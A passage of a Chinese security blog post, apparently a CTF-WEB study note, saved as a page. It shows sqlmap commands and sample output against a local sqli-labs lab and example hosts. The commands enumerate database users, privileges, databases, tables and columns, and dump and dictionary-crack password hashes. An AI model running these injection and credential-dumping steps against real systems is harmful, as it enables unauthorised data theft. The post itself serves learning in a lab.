@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html lang="zn-ch">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="BEACON">
+    
+    <title>
+        
+            SQL-sqlmap的使用 |
+        
+        BEACON
+    </title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="shortcut icon" href="/images/BEACON13.svg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zn-ch","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/BEACON14.png","favicon":"/images/BEACON13.svg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"BEACON FOREVER."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                BEACON
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">SQL-sqlmap的使用</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/BEACON14.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">BEACON</span>
+                        
+                            <span class="author-label">∪▽∪</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2021-05-02 15:06:54
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/CTF-WEB/">CTF-WEB</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/SQL/">SQL</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">基础学习</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/sqlmap/">sqlmap</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>4.2k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>17 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="SQL-sqlmap的使用"><a href="#SQL-sqlmap的使用" class="headerlink" title="SQL-sqlmap的使用"></a>SQL-sqlmap的使用</h1><p><a class="link"   target="_blank" rel="noopener" href="https://sqlmap.campfire.ga/" >sqlmap用户手册中文版<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><p>数据测试以本地自己搭建的sqli-labs靶场为例</p>
+<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><blockquote>
+<p>以下选项可用于枚举后端 DBMS（Database Management System，数据库管理系统）信息、表结构和表中包含的数据。此外，你还可以运行自定义的SQL 语句。</p>
+</blockquote>
+<h3 id="获取全部数据"><a href="#获取全部数据" class="headerlink" title="获取全部数据"></a>获取全部数据</h3><blockquote>
+<p>开关：<code>--all</code></p>
+<p>当用户想要通过使用单个开关远程获取所有可访问数据信息，可以使用该开关。通常不建议这么做，因为它会产生大量的请求同时获取有用无用的数据。</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--all</span></span><br></pre></td></tr></table></figure>
+
+<p>测试了一下，该开关产生许多有用无用的数据，平常使用除非万不得已应该尽量少使用这个</p>
+<h3 id="标语（Banner）"><a href="#标语（Banner）" class="headerlink" title="标语（Banner）"></a>标语（Banner）</h3><blockquote>
+<p>开关：<code>-b</code> 或 <code>--banner</code></p>
+<p>大多数现代 DBMS 具有一个函数和/或一个环境变量，它会返回 DBMS 版本，并最终在其补丁级别详细介绍底层系统。通常这个函数是 <code>version()</code> ，环境变量是 <code>@@version</code>，这取决于目标 DBMS。</p>
+<p>针对 Oracle 目标的示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/oracle/get_int.php?id=1&quot; <span class="operator">-</span>\<span class="operator">-</span>banner</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">11</span>] [INFO] fetching banner</span><br><span class="line">web application technology: PHP <span class="number">5.2</span><span class="number">.6</span>, Apache <span class="number">2.2</span><span class="number">.9</span></span><br><span class="line">back<span class="operator">-</span><span class="keyword">end</span> DBMS: Oracle</span><br><span class="line">banner:    <span class="string">&#x27;Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod&#x27;</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--banner</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502210351444.png"
+                      alt="image-20210502210351444"
+                ></p>
+<h3 id="当前会话用户"><a href="#当前会话用户" class="headerlink" title="当前会话用户"></a>当前会话用户</h3><blockquote>
+<p>开关：<code>--current-user</code></p>
+<p>使用此开关，可以从 Web 应用程序中获取到当前正在执行相关数据库查询操作的 DBMS 用户。</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--current-user</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502210520463.png"
+                      alt="image-20210502210520463"
+                ></p>
+<h3 id="当前数据库"><a href="#当前数据库" class="headerlink" title="当前数据库"></a>当前数据库</h3><blockquote>
+<p>开关：<code>--current-db</code></p>
+<p>使用此开关可以获取 Web 应用程序连接到的 DBMS 数据库名称。</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--current-db</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502210712654.png"
+                      alt="image-20210502210712654"
+                ></p>
+<h3 id="服务器主机名"><a href="#服务器主机名" class="headerlink" title="服务器主机名"></a>服务器主机名</h3><blockquote>
+<p>开关：<code>--hostname</code></p>
+<p>使用此开关可以获取 DBMS 所在的主机名。</p>
+<p>针对 MySQL 目标的示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; <span class="comment">--\hostname</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">[xx:xx:<span class="number">04</span>] [INFO] fetching server hostname</span><br><span class="line">[xx:xx:<span class="number">04</span>] [INFO] retrieved: debian<span class="number">-5.0</span><span class="operator">-</span>i386</span><br><span class="line">hostname:    <span class="string">&#x27;debian-5.0-i386&#x27;</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--hostname</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502210855110.png"
+                      alt="image-20210502210855110"
+                ></p>
+<h3 id="检测当前会话用户是否为数据库管理员"><a href="#检测当前会话用户是否为数据库管理员" class="headerlink" title="检测当前会话用户是否为数据库管理员"></a>检测当前会话用户是否为数据库管理员</h3><blockquote>
+<p>开关：<code>--is-dba</code></p>
+<p>可以检测当前 DBMS 会话用户是否为数据库管理员，也称为 DBA。如果是，sqlmap 将返回 <code>True</code>，否则返回 <code>False</code>。</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--is-dba</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502211024399.png"
+                      alt="image-20210502211024399"
+                ></p>
+<h3 id="列出-DBMS-所有用户"><a href="#列出-DBMS-所有用户" class="headerlink" title="列出 DBMS 所有用户"></a>列出 DBMS 所有用户</h3><blockquote>
+<p>开关：<code>--users</code></p>
+<p>如果当前会话用户对包含 DBMS 用户信息的系统表有读取权限，可以枚举用户列表。</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--users</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502211210814.png"
+                      alt="image-20210502211210814"
+                ></p>
+<h3 id="列出和破解-DBMS-用户的密码哈希"><a href="#列出和破解-DBMS-用户的密码哈希" class="headerlink" title="列出和破解 DBMS 用户的密码哈希"></a>列出和破解 DBMS 用户的密码哈希</h3><blockquote>
+<p>开关：<code>--passwords</code></p>
+<p>如果当前会话用户对包含 DBMS 用户密码信息的系统表有读取权限，则可以枚举每个 DBMS 用户的密码哈希值。sqlmap 将会枚举所有用户，及一一对应的用户密码哈希。</p>
+<p>针对 PostgreSQL 目标的示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1&quot; <span class="comment">--\passwords -v 1</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">back<span class="operator">-</span><span class="keyword">end</span> DBMS: PostgreSQL</span><br><span class="line">[hh:mm:<span class="number">38</span>] [INFO] fetching database users password hashes</span><br><span class="line">do you want <span class="keyword">to</span> use dictionary attack <span class="keyword">on</span> retrieved password hashes? [Y<span class="operator">/</span>n<span class="operator">/</span>q] y</span><br><span class="line">[hh:mm:<span class="number">42</span>] [INFO] <span class="keyword">using</span> hash <span class="keyword">method</span>: <span class="string">&#x27;postgres_passwd&#x27;</span></span><br><span class="line">what<span class="string">&#x27;s the dictionary&#x27;</span>s location? [<span class="operator">/</span>software<span class="operator">/</span>sqlmap<span class="operator">/</span>txt<span class="operator">/</span>wordlist.txt]</span><br><span class="line">[hh:mm:<span class="number">46</span>] [INFO] loading dictionary <span class="keyword">from</span>: <span class="string">&#x27;/software/sqlmap/txt/wordlist.txt&#x27;</span></span><br><span class="line">do you want <span class="keyword">to</span> use common password suffixes? (slow<span class="operator">!</span>) [y<span class="operator">/</span>N] n</span><br><span class="line">[hh:mm:<span class="number">48</span>] [INFO] starting dictionary attack (postgres_passwd)</span><br><span class="line">[hh:mm:<span class="number">49</span>] [INFO] found: <span class="string">&#x27;testpass&#x27;</span> <span class="keyword">for</span> <span class="keyword">user</span>: <span class="string">&#x27;testuser&#x27;</span></span><br><span class="line">[hh:mm:<span class="number">50</span>] [INFO] found: <span class="string">&#x27;testpass&#x27;</span> <span class="keyword">for</span> <span class="keyword">user</span>: <span class="string">&#x27;postgres&#x27;</span></span><br><span class="line">database management <span class="keyword">system</span> users password hashes:</span><br><span class="line">[<span class="operator">*</span>] postgres [<span class="number">1</span>]:    </span><br><span class="line">	password hash: md5d7d880f96044b72d0bba108ace96d1e4    </span><br><span class="line">	clear<span class="operator">-</span>text password: testpass</span><br><span class="line">[<span class="operator">*</span>] testuser [<span class="number">1</span>]:    </span><br><span class="line">	password hash: md599e5ea7a6f7c3269995cba3927fd0093   </span><br><span class="line">	clear<span class="operator">-</span>text password: testpass</span><br></pre></td></tr></table></figure>
+
+<p>以上例子中，sqlmap 不仅枚举了 DBMS 用户及其密码，而且识别出密码哈希格式属于PostgreSQL，并询问用户是否使用字典文件进行散列测试，并识别出了用户 <code>postgres</code> 的明文密码，它通常是 DBA，被识别出的还有用户 <code>testuser</code> 的密码。</p>
+<p>对于可以枚举用户密码哈希的 DBMS 都已实现了此功能，包括 Oracle 和 Microsoft SQL Server 2005 及后续版本。</p>
+<p>你还可以使用 <code>-U</code> 选项来指定要枚举的特定用户，并破解其对应密码哈希。如果你提供 <code>CU</code> 作为用户名，它会将其视为当前用户的别名，并将获取此用户的密码哈希值。</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--passwords</span></span><br><span class="line"></span><br><span class="line">do you want <span class="keyword">to</span> store hashes <span class="keyword">to</span> a temporary file <span class="keyword">for</span> eventual further processing <span class="keyword">with</span> other tools [y<span class="operator">/</span>N] y</span><br><span class="line">do you want <span class="keyword">to</span> perform a dictionary<span class="operator">-</span>based attack against retrieved password hashes? [Y<span class="operator">/</span>n<span class="operator">/</span>q] n</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502212257704.png"
+                      alt="image-20210502212257704"
+                ></p>
+<p>使用<code>-U</code>来指定用户，便只输出指定用户</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>U BEACON <span class="comment">--passwords</span></span><br><span class="line"></span><br><span class="line">do you want <span class="keyword">to</span> store hashes <span class="keyword">to</span> a temporary file <span class="keyword">for</span> eventual further processing <span class="keyword">with</span> other tools [y<span class="operator">/</span>N] y</span><br><span class="line">do you want <span class="keyword">to</span> perform a dictionary<span class="operator">-</span>based attack against retrieved password hashes? [Y<span class="operator">/</span>n<span class="operator">/</span>q] n</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502212601561.png"
+                      alt="image-20210502212601561"
+                ></p>
+<h3 id="列出-DBMS-所有用户权限"><a href="#列出-DBMS-所有用户权限" class="headerlink" title="列出 DBMS 所有用户权限"></a>列出 DBMS 所有用户权限</h3><blockquote>
+<p>开关：<code>--privileges</code></p>
+<p>如果当前会话用户对包含 DBMS 用户信息的系统表有读取权限，则可以枚举出每个 DBMS 用户的权限。根据权限信息，sqlmap 还将显示出哪些是数据库管理员。</p>
+<p>你还可以使用 <code>-U</code> 选项来指定要枚举出权限的用户。</p>
+<p>如果你提供 <code>CU</code> 作为用户名，它会将其视为当前用户的别名，并将获取此用户的权限信息。</p>
+<p>在 Microsoft SQL Server 中，此功能将显示每个用户是否为数据库管理员，而不是所有用户的权限列表。</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--privileges</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502213100773.png"
+                      alt="image-20210502213100773"
+                ></p>
+<h3 id="列出-DBMS-所有用户角色"><a href="#列出-DBMS-所有用户角色" class="headerlink" title="列出 DBMS 所有用户角色"></a>列出 DBMS 所有用户角色</h3><blockquote>
+<p>开关：<code>--roles</code></p>
+<p>如果当前会话用户对包含 DBMS 用户信息的系统表有读取权限，则可以枚举出每个 DBMS 用户的角色。</p>
+<p>你还可以使用 <code>-U</code> 选项来指定要枚举出角色的用户。</p>
+<p>如果你提供 <code>CU</code> 作为用户名，它会将其视为当前用户的别名，并将获取此用户的角色信息。</p>
+<p>此功能仅在 DBMS 为 Oracle 时可用。</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--roles</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502213234254.png"
+                      alt="image-20210502213234254"
+                ></p>
+<h3 id="列出-DBMS-所有数据库"><a href="#列出-DBMS-所有数据库" class="headerlink" title="列出 DBMS 所有数据库"></a>列出 DBMS 所有数据库</h3><blockquote>
+<p>开关：<code>--dbs</code></p>
+<p>如果当前会话用户对包含 DBMS 可用数据库信息的系统表有读取权限，则可以枚举出当前数据库列表。</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--dbs</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502213505074.png"
+                      alt="image-20210502213505074"
+                ></p>
+<h3 id="枚举数据表"><a href="#枚举数据表" class="headerlink" title="枚举数据表"></a>枚举数据表</h3><blockquote>
+<p>开关和选项：<code>--tables</code>，<code>--exclude-sysdbs</code> 和 <code>-D</code></p>
+<p>如果当前会话用户对包含 DBMS 数据表信息的系统表有读取权限，则可以枚举出特定 DBMS 的数据表。</p>
+<p>如果你不使用选项 <code>-D</code> 来指定数据库，则 sqlmap 将枚举所有 DBMS 数据库的表。</p>
+<p>你还可以提供开关 <code>--exclude-sysdbs</code> 以排除所有的系统数据库。</p>
+<p>注意，对于 Oracle，你需要提供 <code>TABLESPACE_NAME</code> 而不是数据库名称。</p>
+</blockquote>
+<p>单纯使用</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+
+<p>使得所有数据表都被枚举，无法准确得到我们想要的数据表，故于可此使用<code>-D</code>来指定数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D security <span class="comment">--tables</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502214029820.png"
+                      alt="image-20210502214029820"
+                ></p>
+<p><code>--exclude-sysdbs</code>用于排除所有系统数据库</p>
+<h3 id="枚举数据表的列名"><a href="#枚举数据表的列名" class="headerlink" title="枚举数据表的列名"></a>枚举数据表的列名</h3><blockquote>
+<p>开关和选项：<code>--columns</code>，<code>-C</code>，<code>-T</code> 和 <code>-D</code></p>
+<p>如果当前会话用户对包含 DBMS 数据表信息的系统表有读取权限，则可以枚举出特定数据表的列名。sqlmap 还将枚举所有列的数据类型。</p>
+<p>此功能可使用选项 <code>-T</code> 来指定表名，还可以使用选项 <code>-D</code> 来指定数据库名称。如果未指定数据库名称，将使用当前的数据库名称。你还可以使用选项 <code>-C</code> 来指定要枚举的表列名。</p>
+<p>针对 SQLite 目标的示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ python sqlmap.py <span class="operator">-</span>u &quot;http://192.168.136.131/sqlmap/sqlite/get_int.php?id=1&quot; <span class="operator">-</span>\</span><br><span class="line"><span class="operator">-</span>columns <span class="operator">-</span>D testdb <span class="operator">-</span>T users <span class="operator">-</span>C name</span><br><span class="line">[...]</span><br><span class="line">Database: SQLite_masterdb</span><br><span class="line"><span class="keyword">Table</span>: users</span><br><span class="line">[<span class="number">3</span> columns]</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">Column</span>  <span class="operator">|</span> Type    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------+</span></span><br><span class="line"><span class="operator">|</span> id      <span class="operator">|</span> <span class="type">INTEGER</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> name    <span class="operator">|</span> TEXT    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> surname <span class="operator">|</span> TEXT    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+---------+</span></span><br></pre></td></tr></table></figure>
+
+<p>注意，对于 PostgreSQL，你需要提供 <code>public</code> 或系统数据库的名称。这是因为不可能枚举其他数据库表，只能枚举出 Web 应用程序用户连接到的数据库模式下的表，它们总是以 <code>public</code> 为别名。</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\sqlmap<span class="operator">&gt;</span>python sqlmap.py <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs:<span class="number">8080</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span> <span class="operator">-</span>D security <span class="operator">-</span>T users <span class="comment">--columns</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210502214612892.png"
+                      alt="image-20210502214612892"
+                ></p>
+<h3 id="枚举-DBMS-模式"><a href="#枚举-DBMS-模式" class="headerlink" title="枚举 DBMS 模式"></a>枚举 DBMS 模式</h3><blockquote>
+<p>开关：<code>--schema</code> 和 <code>--exclude-sysdbs</code></p>
+<p>用户可以使用此开关获取 DBMS 模式。模式列表将包含所有数据库、表和列以及它们各自的类型。结合 <code>--exclude-sysdbs</code>，只有包含非系统数据库的模式才会被获取并显示出来。</p>
